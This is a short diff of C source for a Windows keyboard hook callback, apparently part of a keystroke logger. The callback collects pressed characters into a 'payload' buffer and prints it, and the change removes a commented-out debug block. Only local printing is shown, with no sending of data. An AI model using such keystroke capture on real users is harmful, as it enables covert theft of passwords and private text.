@@ -50,7 +50,7 @@ LRESULT CALLBACK stuff(int nCode, WPARAM wParam, LPARAM lParam)
 					break;
 			}
 		}
-
+		
 		size_t payloadSize = strlen(payload);
 		
 		if((payloadSize + strlen(charAppend)) < 50){
@@ -65,43 +65,6 @@ LRESULT CALLBACK stuff(int nCode, WPARAM wParam, LPARAM lParam)
 			printf("%s\n", payload);
 			memset(payload, '\0', sizeof(payload));
 		}
-
-
-		/*
-		char realLetter;
-		realLetter = (char)letter;
-		char specialLetter[20];
-		char prettyOutput[50][20];
-		uint8_t prettyCounter = 0;
-
-		if(prettyCounter < 20 && specialLetter[0] != '\0'){
-			printf("%s%u\n", "prettyCounter added, now at:\t", prettyCounter);
-			strcpy(prettyOutput[prettyCounter],  specialLetter);
-			printf("The special added is:\t%s", prettyOutput[prettyCounter]);
-			prettyCounter++;
-		}else if(prettyCounter < 20){
-			prettyOutput[prettyCounter][0] = realLetter;
-			prettyCounter++;
-		}else
-		{
-			printf("prettyOutput:\t");
-
-			for (size_t k = 0; k < prettyCounter; k++)
-			{
-    			printf("%s", prettyOutput[k]);
-			}
-
-			prettyCounter = 0;
-
-			for(uint8_t i = 0; i < sizeof(prettyOutput); i++)
-			{
-				for(uint8_t j = 0; j < sizeof(prettyOutput[i]); j++)
-				{
-					prettyOutput[i][j] = '\0';
-				}
-			}
-		}
-		*/
 
 		//printf("Key was pressed!\n");
 		/*
